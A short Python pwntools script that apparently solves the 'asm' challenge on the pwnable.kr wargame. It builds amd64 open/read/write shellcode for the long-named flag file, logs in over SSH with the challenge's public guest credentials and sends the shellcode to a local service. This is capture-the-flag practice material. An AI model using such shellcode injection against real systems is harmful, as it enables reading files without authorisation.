from pwn import *

context(arch = 'amd64', os = 'linux')

flag = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'

code = ''
code += shellcraft.amd64.linux.open(flag)
code += shellcraft.amd64.linux.read(fd='rax', buffer='rsp', count=30)
code += shellcraft.amd64.linux.write(1, 'rsp', 30)
#code += shellcraft.amd64.trap()

print '===== Code ====='
print code
print '================'

shellcode = asm(code)

s = ssh(host='pwnable.kr', port=2222, user='asm', password='guest')
r = s.run('nc 0 9026')

r.recvuntil('give me your x64 shellcode: ')

r.send(shellcode)

print r.recvall()
r.close()
